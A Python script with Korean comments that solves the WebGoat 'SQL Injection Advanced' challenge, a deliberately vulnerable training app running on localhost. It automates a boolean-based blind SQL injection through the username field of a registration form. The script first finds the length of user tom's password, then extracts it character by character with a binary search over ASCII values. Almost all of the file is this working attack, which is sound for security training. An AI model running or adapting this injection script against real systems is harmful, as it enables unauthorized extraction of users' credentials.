import requests
password = str()
url = "http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge"
cookie = {'JSESSIONID':'[쿠키값]'}

password_length = 0
print("finding password length...")
# 패스워드의 길이를 찾는 과정.
for i in range(30):
    payload="tom\' and length(password)="+str(i)+";--"

    #payload -> tom' and length(password)=[문자열의 길이];--

    data = {'username_reg': payload, 'email_reg' : 'test@test.com', 'password_reg' : 'test', 'confirm_password_reg' : 'test'}
    response=requests.put(url,data,cookies=cookie)
    #response에는 WebGoat의 응답 데이터가 기록 된다.
    password_length+=1
    #문자열의 길이를 하나씩 증가 시키며 response의 변화를 살펴본다.
    if 'created' in response.content.decode():
        continue
    #응답 데이터에 created 라는 문자열이 포함되어 있으면 거짓이므로 반복문을 진행한다.
    if 'exists' in response.content.decode():
        break
    #응답 데이터에 exists 라는 문자열이 포함되어 있으면 참이므로 반복문을 멈춘다.
password_length-=1
print(password_length)


mid=0
for i in range(1,password_length+1,1): 
    # 패스워드의 길이만큼 반복문을 돌리며 한 글자 씩 유추를 한다.
    low=65
    high=122
    while(low<high):
        mid=int((low+high)/2)
        payload="tom\' and ascii(substring(password,"+str(i)+",1))>"+str(mid)+";--"

        #payload -> tom' and ascii(substring(passowrd,[찾을 위치],1))>[비교 아스키 코드 숫자 값];--

        data = {'username_reg': payload, 'email_reg' : 'test@test.com', 'password_reg' : 'test', 'confirm_password_reg' : 'test'}
        response=requests.put(url,data,cookies=cookie)
        #response에는 WebGoat의 응답 데이터가 기록 된다.
        print(response.content.decode())
        if 'created' in response.content.decode():
            high=mid
            #응답 데이터에 created 라는 문자열이 포함되어 있으면 ">" 비교 연산자가 거짓이므로
            #high 값을 기존 low와 high 값의 중앙값으로 설정한다.
        if 'already' in response.content.decode():
            low=mid+1
            #응답 데이터에 already 라는 문자열이 포함되어 있으면 ">" 비교 연산자가 참이므로
            #low 값을 하나 증가시킨다.
    password+=chr(low)
    #반복문이 돌면서 low와 high 값이 변경되는데, low=high가 성립하는 순간의 low가 해당 문자의 아스키 코드 값이므로
    #최종적인 password 문자열에 추가시킨다.
print ("res : %s" % password)
